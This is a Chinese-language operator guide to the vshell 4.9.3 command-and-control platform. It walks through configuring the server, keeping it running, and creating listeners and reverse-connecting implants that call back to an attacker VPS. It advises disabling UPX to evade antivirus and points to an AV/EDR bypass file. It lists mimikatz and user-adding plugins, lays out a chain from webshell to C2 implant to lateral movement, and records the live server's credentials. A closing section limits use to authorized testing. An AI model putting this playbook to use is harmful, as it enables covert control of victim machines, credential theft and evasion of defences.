# vshell 4.9.3 详细入门手册

> 来源：本地 `tools/vshell_4.9.3` 二进制 + `work/vshell_analysis` 前端逆向（`schema.js` / `stageless_real.js` / `ListenerIndex.js`）+ 攻击机 <your-attack-server> 实际部署
> 定位：**内网隧道 / C2 控制平台**，不是 WebShell 管理器（那是 GSL5 的活）

---

## 0. 一句话理解 vshell

```
┌─────────────┐   ①管理    ┌──────────────┐   ②被控端主动反连   ┌────────────┐
│  你的浏览器  │ ─────────► │  vshell 服务端 │ ◄────────────────── │  目标机器   │
│  :8082      │            │  <your-attack-server> │   ③形成隧道          │  v_xxx.exe │
└─────────────┘            └──────────────┘                     └────────────┘
```

三个角色必须分清，否则配置必错：

| 角色 | 在哪 | 作用 |
|------|------|------|
| **Server（控制端）** | 你的 VPS | 提供 Web 管理界面 + 收客户端反连 |
| **Listener（监听器）** | VPS 上的一个配置项 | 定义"用哪种协议、在哪个端口等客户端" |
| **Client（客户端/被控端）** | 目标机器 | 连回 Listener，建立隧道，接受指令 |

**关键：客户端是主动连出来的（反向连接）。** 所以目标必须能访问你的 VPS 公网 IP。
如果目标是纯内网、不出网 → vshell 这套用不了，得换其它方案。

---

## 1. 启动控制端

### 1.1 配置文件 `conf/setting.conf`

```ini
# ===== 必须 =====
license=<授权码>              # 没授权起不来，启动时会打印 License OK / 失败
master_type=web               # web / gui / all

# ===== Web 管理界面 =====
web_title=管理平台
web_port=8082                 # ★ Web 端口
web_ip=0.0.0.0

web_basic_auth=true           # ★ 强烈建议 true：防止被资产测绘(FOFA/钟馗之眼)收录
web_jwt_secret=               # 留空 = 每次随机（更安全）；填了则固定
web_username=admin            # ★ 登录账号
web_password=qwe123qwe        # ★ 登录密码 —— 必须改！

# ===== HTTPS（可选）=====
web_open_ssl=false
web_cert_file=conf/server.pem
web_key_file=conf/server.key

# ===== 机器人通知（可选）=====
dingding_access_token=
dingding_key_word=
wx_key=

# ===== 日志 =====
log_level=7                   # 0=Emergency ... 7=Debug
log_path=                     # 留空=输出到 stdout

# ===== 调试（可选，默认注释）=====
#pprof_ip=0.0.0.0
#pprof_port=9999
```

### 1.2 启动

```bash
# Linux
cd /opt/vshell/v_linux_amd64
./v_linux_amd64

# Windows
v_windows_amd64.exe
```

**看启动日志判断成功：**
```
[I] License OK
[I] LicenseName: public, LicenseTime: 20991201, Limit Client: 99, LicenseVIP: true
[I] The version of server is 4.9.3 ,allow client core version to be 4.9.3
[I] web management start, access port is 8082
```
`bind: address already in use` = 端口被占，说明已经有一个在跑了（正常现象，不用管）。

### 1.3 保活（生产必做）

```bash
#!/bin/bash
# keep.sh —— 崩了自动重拉
cd /opt/vshell/v_linux_amd64
while true; do
    ./v_linux_amd64
    echo "vshell exited at $(date), restarting in 3s..."
    sleep 3
done
```
```bash
nohup ./keep.sh > nohup.log 2>&1 &
```

### 1.4 放行端口

- **云安全组**（阿里云控制台）——最容易被忘！
- 本机防火墙：`firewall-cmd --add-port=8082/tcp --permanent && firewall-cmd --reload`

---

## 2. 新增监听（核心概念，逐字段）

登录 Web → **监听管理** → **新增监听**。

### 2.1 字段全表

| 字段 | 中文名 | 必填条件 | 默认值 | 说明 |
|------|--------|---------|--------|------|
| `Mode` | 模式 | 必填 | `tcp` | 见 2.2 |
| `Remark` | 备注 | 选填 | — | 给自己看的，多监听时必填 |
| `ListenAddr` | 监听地址 | `oss` 模式不显示 | `0.0.0.0:8084`<br>`0.0.0.0:53`(dns系) | **VPS 本地监听**。`0.0.0.0` = 所有网卡 |
| `ConnectAddr` | **外网连接地址** | **仅 tcp / kcp** | `127.0.0.1:8084` | ★★★ **最容易填错** |
| `WsConnectAddr` | ws连接地址 | **仅 ws** | `ws://127.0.0.1:8084/ws` | 带 `ws://` 前缀和 `/ws` 路径 |
| `DNSDomain` | NS域名 | **仅 dns/doh/dot** | `ns.example.com` | 你自己的域名 |
| `PublicDNS` | 公共DNS/DOH/DOT地址 | **仅 dns/doh/dot** | doh: `https://dns.alidns.com/dns-query`<br>dot: `dns.ipv6dns.com:853`<br>dns: `8.8.8.8:53` | 上游解析器 |
| `DisconnectTimeout` | 超时心跳次数 | 必填 | `30` 次 | 30×10s=300s 没心跳判离线 |
| `PingInterval` | 心跳间隔 | 必填 | `10` 秒 | 官方的坑：**这是监听器验证客户端超时用的心跳，不是客户端发包频率** |
| `Vkey` | Vkey | 必填 | `qwe123qwe` | ★ **通信凭证**，客户端必须一致才能上线 |
| `EncryptSalt` | 流量加密盐 | 必填 | `qwe123qwe` | ★ 流量加密密钥，客户端必须一致 |
| `OssUrl` | Bucket 域名 | **仅 oss** | — | 对象存储域名，**读写权限须设为「公共读写」** |

### 2.2 模式怎么选

| 模式 | 说明 | 适用场景 |
|------|------|---------|
| **TCP** | 最基础，裸 TCP 长连接 | **默认首选**，简单可靠 |
| **KCP/UDP** | UDP 上做可靠传输，抗丢包 | 目标网络对 TCP 长连接有干扰/限速时 |
| **WebSocket** | 走 ws 协议，伪装成 Web 流量 | 有 HTTP 代理、只放行 80/443 的环境 |
| **DNS** | 走 DNS 查询隧道 | 目标**只出 DNS** 的极端受限网络（慢） |
| **DOH** | DNS over HTTPS | 同上，但走 443，比裸 DNS 隐蔽 |
| **DOT** | DNS over TLS | 同上 |
| **OSS** | 借对象存储中转 | 目标能通 OSS 但连不上你 VPS 时 |

> 入门阶段：**无脑选 TCP**。其余是特定受限环境才用。

### 2.3 ★ ConnectAddr 为什么最容易填错

这个字段的值会被**编译进客户端**，客户端拿它去反连。所以：

```
❌ 错：127.0.0.1:8084   ← 目标机器上的 127.0.0.1 是它自己！永远连不上
✅ 对：<your-attack-server>:8084 ← 必须写 VPS 的公网 IP
```

判断标准：**目标机器上 `ping` 得到的那个地址**。

### 2.4 Vkey / EncryptSalt

- 两者都由**服务端定义**，客户端生成时自动打包进去
- 作用：① 防别人扫到端口就能上线 ② 流量加密
- 多监听可以设不同值，实现隔离
- 改完记得**重新生成客户端**，旧客户端会因凭证不符被拒

---

## 3. 生成客户端并上线

### 3.1 两种客户端

| 类型 | 位置 | 特点 |
|------|------|------|
| **Stageless 反向客户端** | 「Stageless 反向客户端」菜单 | **完整客户端**，直接跑就上线，体积大 |
| Stageless（分阶段） | — | 体积小，但需先落一个 loader |

入门用 **Stageless 反向客户端**。

### 3.2 生成表单

| 字段 | 选项 | 说明 |
|------|------|------|
| **客户端类型** (arch) | `windows_amd64.exe` / `windows_i386.exe`<br>`linux_amd64` / `linux_i386` / `linux_arm64` / `linux_arm`<br>`darwin_amd64` / `darwin_arm64` | 按目标系统架构选，选错跑不起来 |
| **选择监听器** (id) | 下拉列出所有监听 | 显示 `ID: x 备注 模式 监听地址 连接地址` |
| **连接代理** (proxy) | 留空 / `socks5://127.0.0.1:1080` / `http://...` | 目标需经代理出网时填；**仅部分协议支持** |
| **是否UPX压缩** (upx) | 默认 `true` | 压缩体积，但**杀软更容易报毒**；想免杀改 `false` |

生成 URL 形态（便于脚本化）：
```
/download/stageless?id=<监听ID>&arch=<架构>&upx=<true|false>&proxy=<代理>
```

### 3.3 上线命令查看（省事路径）

监听列表里点 **「上线命令查看」**（仅 TCP / WS 模式有）→ 直接给出目标上要执行的命令，不用自己拼。

### 3.4 落地执行

**Windows 目标：**
```cmd
v_windows_amd64.exe
```

**Linux 目标：**
```bash
chmod +x v_linux_amd64
./v_linux_amd64
```

### 3.5 验证上线

监听列表 **「状态」** 列变绿 → **在线**。
不变绿就按第 6 节排查。

---

## 4. 上线之后

监听管理里的操作按钮：

| 按钮 | 作用 |
|------|------|
| **启用 / 停用** | 开停该监听器 |
| **编辑** | 改备注、心跳、Vkey 等 |
| **上线命令查看** | TCP/WS 模式直出上线命令 |
| **删除** | 删监听 |
| **批量选择 / 批量删除** | 多监听管理 |

**携带的插件**（`plugins/` 目录，上传到目标后可直接调用）：

| 插件 | 用途 |
|------|------|
| `fscan.x64.elf` | 内网资产扫描 |
| `gost.x64.exe` / `gost.x64.so` | 隧道/代理转发 |
| `mimikatz.x64.exe` | Windows 凭据抓取 |
| `AddUser.dll` | 添加用户 |

> 配合 `tools/knowledge_base/techniques/kb_intranet_lateral_domain_2026.md` 做横向。

---

## 5. 本环境实际参数（<your-attack-server>）

```ini
版本     : 4.9.3  (License: public/VIP, 到期 20991201, Limit Client 99)
Web 入口 : http://<your-c2-server>:8082
账号     : chana / chana          ← ★ 弱口令，建议改
Basic认证: 已开启
进程     : v_linux_amd64 (pid 762)，由 keep.sh 保活
监听端口 : 8082(web) / 8084(已有监听)
插件目录 : /opt/vshell/v_linux_amd64/plugins/
```

**验证靶机出网（上线前提）：**
```cmd
ping -n 2 <your-attack-server>
```
不通则 vshell 这套用不了。

---

## 6. 常见坑速查

| 现象 | 原因 | 解决 |
|------|------|------|
| 客户端跑了但一直离线 | `ConnectAddr` 填了 `127.0.0.1` | 改成 VPS 公网 IP，**重新生成客户端** |
| 一直离线 | 云安全组没放行监听端口 | 阿里云控制台加规则 |
| 一直离线 | `Vkey`/`EncryptSalt` 与客户端不一致 | 重新生成客户端 |
| 一直离线 | 目标根本不出网 | 先 `ping` VPS 验证；换方案 |
| 起不来 / License 失败 | 授权码无效或过期 | 看启动日志 `License OK` 那行 |
| `bind: address already in use` | 端口被占 | 正常，说明已有实例在跑 |
| Web 打不开 | `web_ip` 绑了内网 / 防火墙 | 改 `0.0.0.0` + 放行 + 查安全组 |
| 被 FOFA 收录 | `web_basic_auth=false` | 改 `true` |
| 客户端被查杀 | UPX 压缩特征 | 生成时 `upx=false`；进一步免杀见 `kb_av_edr_bypass_2026.md` |
| 心跳参数误解 | 以为 `PingInterval` 是客户端发包频率 | 那是监听器判超时用的，客户端频率另算 |

---

## 7. 与 GSL5 的分工（别混）

| 工具 | 定位 | 输入 |
|------|------|------|
| **GSL5 / 哥斯拉** | **WebShell 管理器** | 一个已上传的 webshell 文件 + 密码/密钥 |
| **vshell** | **内网隧道 / C2** | 一个能出网的目标机器，跑客户端上线 |

典型配合链：
```
上传 webshell → GSL5 接管 → 命令执行
  → 上传 vshell 客户端 → 上线 vshell C2
  → 用 vshell 开隧道 / 挂 gost / 跑 fscan / 横向
```

---

## 8. 安全边界提醒

- vshell 是**授权渗透 / 隔离靶场**工具，勿部署到公网真实业务
- 控制端 `web_basic_auth` 必须开，否则会被测绘引擎收录
- 默认口令 `qwe123qwe` 必须改
- 上线客户端 = 对目标机器的**完全控制**，仅限授权范围
